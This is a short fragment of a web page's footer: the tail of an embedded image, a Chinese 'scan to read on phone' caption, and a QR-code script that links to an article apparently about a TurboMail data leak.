HB/LKhae3vgNzIPV9+Rg7DERH7SiOduq6ymNNWOkwHv3Kt+Ug6oAmActLDNA4XXcbTUzJ1pPXydb6WwcaZ581YcWJ38YwEBdO/MwdaAOBPmF4nh9tN0/dPug9j7hcC1Fjf9bO5hA9YET3zQjhy5xzCA0w1U5F3o9FoOnmKoTuawOpjJN7/x2YA3n/PT+84r8AAAD//ygbo/oAAAAGSURBVAMACbhPmxAbkkoAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/turbomail-mailmain-data-leak.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 